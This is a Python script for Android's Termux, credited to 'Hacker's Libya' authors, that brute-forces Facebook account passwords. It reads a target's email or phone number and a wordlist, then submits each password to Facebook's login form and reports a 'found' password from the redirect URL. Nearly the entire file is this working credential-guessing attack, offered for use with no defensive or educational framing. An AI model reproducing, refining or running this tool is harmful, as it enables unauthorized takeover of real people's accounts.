#!/data/data/com.termux/files/usr/bin/python
r="\033[1;31m"
g="\033[1;32m"
b="\033[1;34m"

from mechanize import Browser
from bs4 import BeautifulSoup
import cookielib
import mechanize
import os ,sys ,time
import random
br = Browser()
cj = cookielib.LWPCookieJar()
br.set_handle_robots(False)
br.set_handle_equiv(True)
br.set_handle_referer(True)
br.set_handle_redirect(True)
br.set_cookiejar(cj)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor() ,max_time=1)
headers = useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
print ("""
                  
                 
    \033[92m    @@@@@@@@@@@@>>>\033[31m Facebook\033[92m <<<@@@@@@@@@@@
\033[92m                 @@@@@@@@@@@@@@@@@@@@@
\033[92m                 @@  HUAWEI NOVA 3i @@
\033[92m                 @@*****************@@
\033[92m                 @@\033[94m By:- AHSAN ALSAEH\033[92m@
\033[92m                 @@@@@@@@@@@@@@@@@@@@@

\033[92m
\033[31m

""")
email = raw_input("\033[31m E-mail or ID or Phone ->\033[94m ")
wlist = raw_input("\033[92m  Word list Password ->\033[94m")
w = open(wlist,"r")
for i in w.readlines():
    i = i.rstrip("\n")
    br.open( "https://www.facebook.com/login.php" )
    br.select_form(nr=0)
    br.form['email'] = email
    br.form['pass'] = i
    br.submit()
    we = (br.geturl())
    if we == "https://www.facebook.com/":
       print "Yas Password ---> " + i
    else:
        if we == "https://web.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100":
           print ("\033[31m")
           print ("No Password --> ") + i
        else:    
             print ("\033[92m") 
             print ("Yas Password --> ") + i
             os.system("mpv termux.m4a") 
             print ("Find Password > > > > + i + < < < < <")
             print ("""
             \033[92m                        .. . . . .
                  </>                    .   , ,         ,. 
             <.> Good Bay <.>         .  .  .    ..        .
             By:- Ahsan Alsaeh       .                    .
             And ..                .... Hacker's Libya .....
             Ahmed Albosife              
             """)
               